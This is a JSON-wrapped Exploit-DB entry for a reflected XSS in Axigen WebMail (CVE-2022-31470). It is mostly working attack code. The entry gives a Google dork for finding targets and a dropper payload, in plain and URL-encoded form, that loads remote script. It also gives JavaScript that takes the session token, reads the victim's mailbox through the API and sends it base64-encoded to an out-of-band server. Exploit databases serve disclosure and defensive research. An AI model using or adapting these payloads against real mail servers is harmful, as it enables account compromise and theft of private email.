{"source": "https://www.exploit-db.com/exploits/51722", "vulnName": "Axigen < 10.3.3.47, 10.2.3.12 - Reflected XSS", "vulnEDBID": "51722", "vulnCVE": "2022-31470", "author": "AMIRZARGHAM", "exploitType": "WEBAPPS", "platform": "MULTIPLE", "datePublished": "2023-09-08", "vulnContent": "# Exploit Title: Axigen < 10.3.3.47, 10.2.3.12 - Reflected XSS\n# Google Dork: inurl:passwordexpired=yes\n# Date: 2023-08-21\n# Exploit Author: AmirZargham\n# Vendor Homepage: https://www.axigen.com/\n# Software Link: https://www.axigen.com/mail-server/download/\n# Version: (10.5.0\u20134370c946) and older version of Axigen WebMail\n# Tested on: firefox,chrome\n# CVE: CVE-2022-31470\n\nExploit\nWe use the second Reflected XSS to exploit this vulnerability, create a\nmalicious link, and steal user emails.\n\nDropper code\nThis dropper code, loads and executes JavaScript exploit code from a remote\nserver.\n\n');\nx = document.createElement('script');\nx.src = 'https://example.com/exploit.js';\nwindow.addEventListener('DOMContentLoaded',function y(){\n  document.body.appendChild(x)\n})//\n\n\n\nEncoded form\n\n/index.hsp?m=%27)%3Bx%3Ddocument.createElement(%27script%27)%3Bx.src%3D%27\nhttps://example.com/exploit.js%27%3Bwindow.addEventListener(%27DOMContentLoaded%27,function+y(){document.body.appendChild(x)})//\n\n\nExploit code\n\nxhr1 = new XMLHttpRequest(), xhr2 = new XMLHttpRequest(), xhr3 = new\nXMLHttpRequest();\noob_server = 'https://example.com/';\nvar script_tag = document.createElement('script');\n\nxhr1.open('GET', '/', true);\nxhr1.onreadystatechange = () => {\n    if (xhr1.readyState === XMLHttpRequest.DONE) {\n        _h_cookie = new URL(xhr1.responseURL).search.split(\"=\")[1];\n        xhr2.open('PATCH', `/api/v1/conversations/MQ/?_h=${_h_cookie}`,\ntrue);\n        xhr2.setRequestHeader('Content-Type', 'application/json');\n        xhr2.onreadystatechange = () => {\n            if (xhr2.readyState === XMLHttpRequest.DONE) {\n                if (xhr2.status === 401){\n                    script_tag.src =\n`${oob_server}?status=session_expired&domain=${document.domain}`;\n                    document.body.appendChild(script_tag);\n                } else {\n                    resp = xhr2.responseText;\n                    folderId = JSON.parse(resp)[\"mails\"][0][\"folderId\"];\n                    xhr3.open('GET',\n`/api/v1/conversations?folderId=${folderId}&_h=${_h_cookie}`, true);\n                    xhr3.onreadystatechange = () => {\n                        if (xhr3.readyState === XMLHttpRequest.DONE) {\n                            emails = xhr3.responseText;\n                            script_tag.src =\n`${oob_server}?status=ok&domain=${document.domain}&emails=${btoa(emails)}`;\n                            document.body.appendChild(script_tag);\n                        }\n                    };\n                    xhr3.send();\n                }\n            }\n        };\n        var body = JSON.stringify({isUnread: false});\n        xhr2.send(body);\n    }\n};\nxhr1.send();\n\n\nCombining dropper and exploit\nYou can host the exploit code somewhere and then address it in the dropper\ncode.\n            "}